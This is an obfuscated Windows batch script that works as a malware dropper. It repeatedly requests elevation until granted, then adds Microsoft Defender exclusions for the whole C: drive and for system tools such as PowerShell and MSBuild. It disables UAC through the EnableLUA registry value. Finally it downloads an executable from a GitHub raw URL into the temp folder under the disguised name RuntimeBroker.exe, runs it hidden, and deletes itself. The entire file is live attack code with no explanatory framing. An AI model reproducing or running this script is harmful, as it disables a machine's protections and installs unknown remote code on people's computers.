@echo off & setlocal enableDelayedExpansion
set "Ojr=SESSION" & set "bYq=>nul" & set "LvqV=2>&1" & set "XlGCv=NET"
%XlGCv% %Ojr% %bYq% %LvqV%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "rHVH=baz" & set "AWTvQ=foo" & set "zEl=qux" & set "tDmi=bar" & rem Wazypo rhnOznD lrsH
set "Xecji=powershell -ExecutionPolicy Bypass -Command"
set "wuk=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "fCWuE='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "FTS='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!Xecji! "!wuk! !fCWuE! !FTS!" %bYq% %LvqV%
set "mOw=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "yYMB=-Name 'EnableLUA' -Value 0"
!Xecji! "!mOw! !yYMB!" %bYq% %LvqV%
set "pyAH=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!Xecji! "!pyAH!" %bYq% %LvqV%
if !errorlevel! neq 0 (goto %a%)
set "cfQJ=timeout /t" & !cfQJ! 2 %bYq% %LvqV%
set "CbFmg=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "tPjPB=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "OqAeV=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!Xecji! "!CbFmg! !tPjPB! !OqAeV!" %bYq% %LvqV%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!cfQJ! 1 %bYq% %LvqV% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %bYq% %LvqV%
del /f /q "%~f0" %bYq% %LvqV%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %bYq% %LvqV%
if !errorlevel! neq 0 (!cfQJ! 3 %bYq% %LvqV% & goto %b%)
exit /b
